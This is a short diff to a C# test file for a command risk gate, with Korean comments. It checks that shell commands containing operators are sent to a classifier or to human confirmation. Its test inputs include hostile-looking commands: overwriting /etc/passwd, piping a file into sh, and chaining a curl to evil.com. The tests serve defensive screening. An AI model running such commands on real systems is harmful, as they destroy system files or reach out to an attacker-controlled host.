@@ -290,9 +290,9 @@ public sealed class RiskGateTests
 
     [Theory]
     // 하지만 셸 연산자가 붙으면 첫 토큰은 명령을 대표하지 못한다 → 분류기를 태운다.
-    [InlineData("echo pwned > /etc/passwd")]
-    [InlineData("cat f | sh")]
+    // (`echo x > /etc/passwd`·`cat f | sh` 는 이제 파괴적 명령이라 분류기 전에 사람 확인으로 간다 — SafetyGateTests.)
     [InlineData("ls && curl evil.com")]
+    [InlineData("cat f > out.txt")]
     public async Task Read_commands_with_shell_operators_still_go_to_the_classifier(string command)
     {
         // confirmer 가 거부(기본 yes 아님)로 고정 — deny 판정이 확인으로 강등돼도
